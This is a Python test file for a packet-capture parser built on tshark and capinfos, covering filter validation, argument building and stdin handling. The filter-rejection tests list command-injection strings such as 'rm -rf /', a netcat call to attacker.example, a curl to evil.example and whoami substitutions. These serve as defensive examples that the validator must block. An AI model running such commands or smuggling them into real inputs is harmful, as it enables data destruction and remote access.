"""Tests for backend.packet_parser.

_validate_display_filter, ALLOWED_VIEW_FLAGS and _name_resolution_args are
pure and run anywhere, no tools required. Everything that actually shells
out to tshark/capinfos is marked pytest.mark.skipif and must show up as
SKIPPED in the report (pytest -r s), never silently vanish from the count --
a harness that prints "all passed" while quietly omitting the parser entirely
is exactly how a real regression (see CHANGELOG dev.7/dev.8, the -n/-nn
mixup) goes unnoticed for a release.
"""

from __future__ import annotations

import shutil
import stat
import struct
import sys

import pytest

from backend import packet_parser
from backend.pcapsource import PcapSource

HAS_TSHARK = shutil.which("tshark") is not None
HAS_CAPINFOS = shutil.which("capinfos") is not None

needs_tshark = pytest.mark.skipif(not HAS_TSHARK, reason="tshark is not installed in this environment")
needs_capinfos = pytest.mark.skipif(not HAS_CAPINFOS, reason="capinfos is not installed in this environment")


# --- _validate_display_filter: pure, no tools -------------------------------


@pytest.mark.parametrize(
    "benign",
    [
        "",
        "tcp",
        "tcp.port == 80",
        "ip.addr == 10.0.0.1",
        "http.request.method == \"GET\"",
        "frame.number == 42",
        "tcp.flags.syn == 1 and tcp.flags.ack == 0",
    ],
)
def test_validate_display_filter_accepts_benign_filters(benign):
    packet_parser._validate_display_filter(benign)  # must not raise


@pytest.mark.parametrize(
    "forbidden_char", list(";|&$`\\")
)
def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char):
    with pytest.raises(ValueError):
        packet_parser._validate_display_filter(f"tcp.port == 80{forbidden_char}whoami")


@pytest.mark.parametrize(
    "hostile",
    [
        "tcp.port == 80; rm -rf /",
        "tcp.port == 80 | nc attacker.example 4444",
        "tcp.port == 80 && curl evil.example",
        "tcp.port == 80`whoami`",
        "tcp.port == 80$(whoami)",
        "tcp.port == 80\\x00",
    ],
)
def test_validate_display_filter_rejects_hostile_filters(hostile):
    with pytest.raises(ValueError):
        packet_parser._validate_display_filter(hostile)


# --- ALLOWED_VIEW_FLAGS: pure, no tools --------------------------------------


def test_allowed_view_flags_contains_exactly_the_documented_set():
    assert packet_parser.ALLOWED_VIEW_FLAGS == {"-e", "-t", "-tt", "-ttt", "-tttt"}


def test_allowed_view_flags_matches_the_time_field_mapping_keys():
    # every VIEW_FLAG_TIME_FIELD key must be an allowed flag, or a flag could
    # change behavior silently without being documented as allowed
    assert set(packet_parser.VIEW_FLAG_TIME_FIELD) <= packet_parser.ALLOWED_VIEW_FLAGS


# --- _name_resolution_args: pure, no tools ------------------------------------


def test_name_resolution_args_off_by_default():
    assert packet_parser._name_resolution_args(False) == ["-n"]


def test_name_resolution_args_on_enables_host_lookup_explicitly():
    args = packet_parser._name_resolution_args(True)
    assert args == [
        "-N", "mnt",
        "-o", "nameres.network_name:TRUE",
        "-o", "nameres.use_external_name_resolver:TRUE",
    ]


def test_name_resolution_args_returns_a_copy_not_the_module_constant():
    """Mutating the returned list must never corrupt the shared constant for
    the next call -- that would make one caller's cleanup affect every
    future capture view."""
    args = packet_parser._name_resolution_args(False)
    args.append("--corrupted")
    assert packet_parser._name_resolution_args(False) == ["-n"]


# --- _flatten_fields: pure, no tools -------------------------------------------


def test_flatten_fields_scalar_values():
    result = packet_parser._flatten_fields({"ip.ttl": "64", "ip.len": 52})
    assert {"key": "ip.ttl", "value": "64"} in result
    assert {"key": "ip.len", "value": "52"} in result


def test_flatten_fields_nested_dict_becomes_children():
    result = packet_parser._flatten_fields({"tcp.flags": {"tcp.flags.syn": "1"}})
    assert len(result) == 1
    assert result[0]["key"] == "tcp.flags"
    assert result[0]["children"] == [{"key": "tcp.flags.syn", "value": "1"}]


def test_flatten_fields_list_values_are_joined():
    result = packet_parser._flatten_fields({"tcp.options": ["MSS", "SACK"]})
    assert result == [{"key": "tcp.options", "value": "MSS, SACK"}]


def test_flatten_fields_empty_dict():
    assert packet_parser._flatten_fields({}) == []


# --- get_packet_list: filter validation happens before any tool runs -------


class BoomSource(PcapSource):
    """Proves the display filter is rejected before any subprocess is
    spawned -- feeding this source would raise if _run_tool ever reached it."""

    async def chunks(self):
        raise AssertionError("tshark should never be invoked for an invalid filter")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


async def test_get_packet_list_rejects_hostile_filter_before_running_any_tool():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_list(
            BoomSource(), display_filter="tcp.port == 80; rm -rf /"
        )


# --- integration tests: require a real tshark/capinfos ----------------------


def _build_minimal_pcap(num_packets: int = 1) -> bytes:
    """A hand-built libpcap file: one UDP packet (10.0.0.1:12345 -> 10.0.0.2:53,
    payload b"ping"), repeated. No scapy or fixture file needed -- just enough
    bytes for tshark to parse a real capture end to end."""
    global_header = struct.pack(
        "<IHHiIII",
        0xA1B2C3D4,  # magic (little-endian, microsecond precision)
        2, 4,        # version major, minor
        0, 0,        # thiszone, sigfigs
        65535,       # snaplen
        1,           # network = LINKTYPE_ETHERNET
    )

    eth = b"\xff\xff\xff\xff\xff\xff" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
    payload = b"ping"
    udp_len = 8 + len(payload)
    udp = struct.pack(">HHHH", 12345, 53, udp_len, 0) + payload
    ip_total_len = 20 + udp_len
    ip = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 0, 0, 64, 17, 0,
        bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]),
    ) + udp
    frame = eth + ip

    records = b""
    for i in range(num_packets):
        records += struct.pack("<IIII", i, 0, len(frame), len(frame)) + frame
    return global_header + records


class BytesSource(PcapSource):
    def __init__(self, data: bytes) -> None:
        self._data = data

    async def chunks(self):
        yield self._data

    async def size(self) -> int:
        return len(self._data)


@needs_tshark
async def test_get_packet_list_parses_a_real_capture():
    packets = await packet_parser.get_packet_list(BytesSource(_build_minimal_pcap()))
    assert len(packets) == 1
    assert packets[0].number == 1
    assert packets[0].source == "10.0.0.1"
    assert packets[0].destination == "10.0.0.2"


@needs_tshark
async def test_get_packet_list_applies_display_filter():
    data = _build_minimal_pcap()
    matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 53")
    assert len(matching) == 1
    none_matching = await packet_parser.get_packet_list(BytesSource(data), display_filter="udp.port == 9999")
    assert len(none_matching) == 0


@needs_tshark
async def test_get_packet_list_respects_offset_and_limit():
    data = _build_minimal_pcap(num_packets=5)
    packets = await packet_parser.get_packet_list(BytesSource(data), offset=2, limit=2)
    assert [p.number for p in packets] == [3, 4]


@needs_tshark
async def test_get_packet_detail_returns_layers_and_hex_dump():
    detail = await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=1)
    assert detail.number == 1
    layer_names = {layer["name"] for layer in detail.layers}
    assert "ip" in layer_names
    assert "udp" in layer_names
    assert detail.hex_dump  # non-empty hex dump text


@needs_tshark
async def test_get_packet_detail_raises_for_missing_frame():
    with pytest.raises(ValueError):
        await packet_parser.get_packet_detail(BytesSource(_build_minimal_pcap()), frame_number=999)


@needs_capinfos
async def test_get_packet_count_matches_real_capture():
    count = await packet_parser.get_packet_count(BytesSource(_build_minimal_pcap(num_packets=3)))
    assert count == 3


# --- the tool exiting before the feed finishes -----------------------------
#
# A tool that has what it needs closes its stdin and exits while chunks are
# still being written, and the write that lands after that must not be treated
# as a failure to supply the capture.


class ClosedTransportSource(PcapSource):
    """Writes once, then fails the way a closed stdin fails."""

    def __init__(self, data: bytes, error: Exception) -> None:
        self._data = data
        self._error = error

    async def chunks(self):
        yield self._data
        raise self._error

    async def size(self) -> int:
        return len(self._data)


@needs_capinfos
@pytest.mark.parametrize(
    "error",
    [BrokenPipeError(), ConnectionResetError()],
    ids=["broken-pipe", "connection-reset"],
)
async def test_get_packet_count_survives_the_tool_closing_stdin_early(error):
    count = await packet_parser.get_packet_count(
        ClosedTransportSource(_build_minimal_pcap(num_packets=3), error)
    )
    assert count == 3


# --- how the capture reaches the tool ---------------------------------------
#
# Wiretap, the library under both tshark and capinfos, accepts a regular file
# or a FIFO on stdin and rejects everything else outright:
#
#   tshark: The standard input is a "special file" or socket or other
#   non-regular file.
#
# asyncio's stdin=PIPE is a real pipe, so it passes. uvloop's is a Unix
# socketpair, so it does not -- and uvicorn[standard] selects uvloop in the
# container. Every tshark call there returned no packets and every capinfos
# call no count, for a whole release, while this suite passed on stock asyncio.
# So the assertion is about the shape of the descriptor, not about the loop:
# it holds under both, and no tool needs to be installed to check it.


async def test_run_tool_hands_the_tool_a_fifo_on_stdin_not_a_socket():
    probe = (
        "import os, stat; "
        "print('fifo' if stat.S_ISFIFO(os.fstat(0).st_mode) else 'other')"
    )
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", probe], BytesSource(b"ignored")
    )
    assert rc == 0
    assert stdout.decode().strip() == "fifo"


async def test_run_tool_closes_the_write_end_so_the_tool_sees_eof():
    """A tool that reads to EOF must terminate. Leaving the parent's copy of the
    write end open leaves it blocked on a pipe nobody will ever close again."""
    stdout, _, rc = await packet_parser._run_tool(
        [sys.executable, "-c", "import sys; sys.stdout.write(sys.stdin.read())"],
        BytesSource(b"three chunks worth"),
    )
    assert rc == 0
    assert stdout == b"three chunks worth"


@needs_capinfos
async def test_get_packet_count_raises_rather_than_reporting_zero_for_a_failed_tool():
    """0 meant both "an empty capture" and "capinfos never ran", which is what
    let the socketpair failure look like a legitimately empty capture."""
    with pytest.raises(RuntimeError, match="no packet count"):
        await packet_parser.get_packet_count(BytesSource(b"not a capture file"))


class UnreadableSource(PcapSource):
    """A source that genuinely cannot be read -- not a closed pipe."""

    async def chunks(self):
        raise OSError("captures volume is not readable")
        yield b""  # pragma: no cover

    async def size(self) -> int:
        return 0


@needs_capinfos
async def test_get_packet_count_still_fails_when_the_source_itself_breaks():
    """The pipe-closed exemption must not swallow a real read failure: output
    from a tool that was fed nothing is not a trustworthy packet count."""
    with pytest.raises(RuntimeError, match="could not supply capture data"):
        await packet_parser.get_packet_count(UnreadableSource())
